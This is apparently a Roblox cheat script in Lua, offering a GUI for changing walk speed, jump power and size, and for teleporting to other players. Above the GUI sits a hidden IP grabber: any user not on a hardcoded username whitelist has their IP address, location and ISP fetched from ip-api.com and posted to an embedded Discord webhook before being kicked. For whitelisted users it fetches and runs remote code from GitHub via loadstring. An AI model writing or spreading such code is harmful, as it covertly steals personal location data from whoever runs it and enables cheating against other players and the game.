-- Whitelist for specific usernames
local whitelistedUsers = {
    "Mrbignewcoming3",
    "Hi_dorihi",  -- whitelisted
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
    for _, whitelisted in ipairs(whitelistedUsers) do
        if username == whitelisted then
            return true
        end
    end
    return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Function to send data to the webhook
local function sendWebhookData(player_name, ipinfo_table)
    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    local success, response = pcall(function()
        game:GetService("HttpService"):PostAsync(
            webhook_url, 
            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
            Enum.HttpContentType.ApplicationJson
        )
    end)

    if not success then
        warn("Failed to send webhook data: " .. response)
    end
end

-- If the player is not whitelisted, get their IP info and kick them
if not isWhitelisted(username) then
    local player_name = player.Name

    -- Get IP information
    local ip_info
    local success, response = pcall(function()
        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
    end)

    if not success then
        warn("Failed to get IP info: " .. response)
        return
    end

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)

    -- Send IP info to webhook
    sendWebhookData(player_name, ipinfo_table)

    -- Kick the player
    player:Kick("Not WhiteListed L")
else
    -- If the player is whitelisted, load the GUI

    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()

    local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
        main_color = Color3.fromRGB(0, 0, 0), -- Color
        min_size = Vector2.new(500, 450), -- Size of the gui
        can_resize = false, -- true or false
    })

    local Client = window:AddTab("Client")
    Client:AddLabel("Local Player")

    -- Set Size 2
    Client:AddButton("Set Size 2", function()
        local args = {
            [1] = "changeSize",
            [2] = 2
        }

        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
    end)

    -- WalkSpeed TextBox
    Client:AddTextBox("Type WalkSpeed Amount", function(text)
        local walkSpeedAmount = tonumber(text)
        if walkSpeedAmount then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedAmount
        else
            print("Invalid WalkSpeed input!")
        end
    end)

    -- JumpPower TextBox
    Client:AddTextBox("Type JumpPower Amount", function(text)
        local jumpPowerAmount = tonumber(text)
        if jumpPowerAmount then
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerAmount
        else
            print("Invalid JumpPower input!")
        end
    end)

    -- Size TextBox
    Client:AddTextBox("Type Size (1 to 500)", function(text)
        local sizeAmount = tonumber(text)
        if sizeAmount and sizeAmount >= 1 and sizeAmount <= 500 then
            local character = game.Players.LocalPlayer.Character
            if character then
                character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame)  -- Reset the character's CFrame to avoid issues while resizing
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Size = Vector3.new(sizeAmount, sizeAmount, sizeAmount)
                    end
                end
            end
        else
            print("Invalid size input! Please enter a value between 1 and 500.")
        end
    end)

   -- Players tab for selecting a player and viewing stats
local PlayersTab = window:AddTab("Players")

local selectedPlayerName
local currentSelectedPlayer
local notFoundLabel

-- Function to remove labels of previous selected player
local function removePlayerLabels(player)
    -- Custom function to remove previously created labels
    -- You can remove the player's stats or other UI elements here
end

-- Function to create player labels (for example, stats)
local function createPlayerLabels(player)
    -- Custom function to create and show player stats/labels here
    -- You could display their health, level, etc.
end

-- Dropdown for selecting a player
PlayersTab:AddDropdown("Select Player", function(playerName)
    selectedPlayerName = playerName
    if notFoundLabel then
        notFoundLabel:Remove()
        notFoundLabel = nil
    end

    local player = game.Players:FindFirstChild(playerName)
    if player then
        if currentSelectedPlayer then
            removePlayerLabels(currentSelectedPlayer)
        end
        createPlayerLabels(player)
        currentSelectedPlayer = playerName
    else
        notFoundLabel = PlayersTab:AddLabel("Player not found!")
    end
end)

-- Update the player list dynamically
local function updatePlayerList()
    local dropdown = PlayersTab:GetDropdown("Select Player")
    if dropdown then
        dropdown:Clear()  -- Clear the existing options
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            dropdown:Add(player.Name)  -- Add new player to dropdown
        end
    end
end

-- Call the update function on player join/leave
game:GetService("Players").PlayerAdded:Connect(updatePlayerList)
game:GetService("Players").PlayerRemoving:Connect(updatePlayerList)

-- Initial update when the script is first loaded
updatePlayerList() 

-- Server tab to show elapsed time and player count
local ServerTab = window:AddTab("Server")

local elapsedTimeLabel = ServerTab:AddLabel("Elapsed Time:")
local playerCountLabel = ServerTab:AddLabel("Amount of Players in Server:")

local elapsedTime = 0  -- Start with 0 elapsed time

-- Function to format the elapsed time
local function formatElapsedTime(seconds)
    local week = math.floor(seconds / 604800)  -- 7 days = 604800 seconds
    local day = math.floor((seconds % 604800) / 86400)  -- 1 day = 86400 seconds
    local hour = math.floor((seconds % 86400) / 3600)  -- 1 hour = 3600 seconds
    local minute = math.floor((seconds % 3600) / 60)  -- 1 minute = 60 seconds
    local second = seconds % 60  -- Remaining seconds
    return string.format("Week: %d Day: %d Hour: %d Minute: %d Second: %d", week, day, hour, minute, second)
end

-- Update elapsed time every second
game:GetService("RunService").Heartbeat:Connect(function()
    elapsedTime = elapsedTime + 1  -- Increase by 1 second
    elapsedTimeLabel:SetText("Elapsed Time: " .. formatElapsedTime(elapsedTime))  -- Update label
end)

-- Update player count
local function updatePlayerCount()
    playerCountLabel:SetText("Amount of Players in Server: " .. #game.Players:GetPlayers())  -- Update label with player count
end

-- Listen for player join/leave
game.Players.PlayerAdded:Connect(updatePlayerCount)
game.Players.PlayerRemoving:Connect(updatePlayerCount)

-- Create the player selection dropdown
local dropdown = ServerTab:AddDropdown("Select Player", function(selectedName)
    if selectedName then
        local selectedPlayer = game.Players:FindFirstChild(selectedName)
        if selectedPlayer then
            -- Teleport the local player to the selected player
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame
        end
    end
end)

-- Dynamically populate the player dropdown with player names
game:GetService("RunService").Heartbeat:Connect(function()
    if dropdown then
        dropdown:Clear()  -- Clear the current dropdown options
        for _, player in ipairs(game.Players:GetPlayers()) do
            dropdown:Add(player.Name)  -- Add each player name to the dropdown
        end
    end
end)
    



--script whitelist end
end
